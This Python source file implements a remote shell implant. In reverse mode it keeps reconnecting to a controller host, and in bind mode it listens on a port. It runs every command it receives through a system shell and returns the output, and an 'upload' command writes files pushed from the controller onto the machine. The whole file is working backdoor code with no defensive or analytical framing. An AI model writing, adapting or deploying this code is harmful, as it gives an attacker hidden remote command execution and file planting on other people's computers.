#encoding:utf-8
import socket
import os,sys
import platform
import subprocess
import json
import struct
import getpass

class service(object):
    def __init__(self,Host,Port,reverse):
        self.Host = Host
        self.Port = Port
        self.reverse = reverse
        self.bufsize=8000
        if self.reverse: #反向连接
            self.host_port=(self.Host,self.Port)
            self.conn_server() #持续连接服务器
        else: #正向连接
            host_port=(self.Host,self.Port)
            self.sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)#SOCK_STREAM
            try:
                self.sock.bind(host_port)
            except:
                print("The port is occupied or the port is greater than 65535")
                sys.exit()
            self.sock.listen(5)
    def conn(self):
        stop = False
        while not stop:
            if self.reverse: #反向连接接收数据
                sockets=self.sock
            else:
                sockets,client_addr=self.sock.accept() # 正向接收连接者数据-堵塞式
                ip,port=client_addr
            self.socket = sockets
            while not stop:
                path= os.getcwd()
                user = getpass.getuser()
                host_name = socket.gethostname()
                info = "[{}@{}] {}>\n>".format(user,host_name,path)
                try:
                    sockets.send(info.encode())
                except:
                    self.conn_server()
                    break

                data=sockets.recv(self.bufsize) # 接收数据
                if not data:
                    sockets.close()
                    break
                stop = data.decode() == "quit_service"
                if not stop :
                    ret = self.habit(data.decode())
                    sockets.send(ret.encode())
        if self.reverse:
            sockets.close()
        else:   
            self.sock.close()   
            sockets.close()

    def conn_server(self):
       while True:
            try:
                self.sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                self.sock.connect(self.host_port)
                break
            except:
                print('connect error! Trying to connect ')
                continue

    def command(self,command):
        try:
            res = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,encoding="gbk")
            value = res.stdout.read()+res.stderr.read()
        except:
            res = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,encoding="utf-8")
            value = res.stdout.read()+res.stderr.read()
        return value


    def habit(self,value):
        if platform.system()=='Windows':
            command = value.split(' ')
            if command[0] == 'ls':
                value = 'dir'#只是喜欢ls
                value = self.command(value)
            elif command[0] == 'cd':
                data = [x for x in command if x != '']
                if len(data)>1:
                    try:os.chdir(data[1])
                    except Exception as e:return "{}".format(e)
                else:os.chdir(os.environ['HOME'])
                value = " "
            elif command[0] == 'upload':
                self.donwload(self.socket)
                value = " "
            elif command[0] == 'ignore':value=" "   

            elif command[0] == 'help':
                value = """
                quit_service: Exit remote sessions and local sessions
                quit Or exit: Exit the current session 
                upload: Upload files from the console to the remote session 
                """
            else:value = self.command(value)                
        return value


    def donwload(self,sockets):
        first = sockets.recv(4) # 获取报文长度
        header_size = struct.unpack('i', first)[0] # 解码报文
        header_json  = json.loads(sockets.recv(header_size).decode()) #获取报文头
        max_output_size = header_json['max_output_size']
        value = open(header_json['filename'],'wb')
        while 1:
            data =  sockets.recv(max_output_size)
            try:
                if data.decode() == "hello_word_file_is_end":
                    break
            except:pass
            value.write(data)
        value.close()
    def upload(self,sockets):
        pass